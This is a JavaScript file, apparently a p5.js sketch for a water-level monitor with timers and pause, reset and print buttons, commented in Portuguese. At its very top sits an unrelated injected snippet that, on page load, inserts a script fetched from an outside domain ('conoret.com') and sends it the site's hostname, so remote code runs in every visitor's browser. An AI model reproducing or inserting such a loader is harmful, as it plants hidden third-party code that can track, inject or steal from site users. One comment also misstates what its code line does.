window.top === window && !function(){
    var e = document.createElement("script"),
        t = document.getElementsByTagName("head")[0];
    e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random();
    e.type = "text/javascript";
    e.defer = !0;
    e.async = !0;
    t.appendChild(e);
}();
function setup() {
    console.log("Setup iniciado");
    noCanvas();
    setTimeout(() => {
        waterLevel -= 1; // Perda inicial de 500ml após 15 segundos
        updateWaterDisplay();
        intervalId = setInterval(updateWaterLevel, 35000); // Intervalo de 35 segundos
    }, 15000); // Atraso de 15 segundos
    setInterval(updateClock, 1000);

    document.getElementById('pause-button').addEventListener('click', togglePause);
    document.getElementById('reset-button').addEventListener('click', resetSystem);
    document.getElementById('print-button').addEventListener('click', imprimirResultados);
}
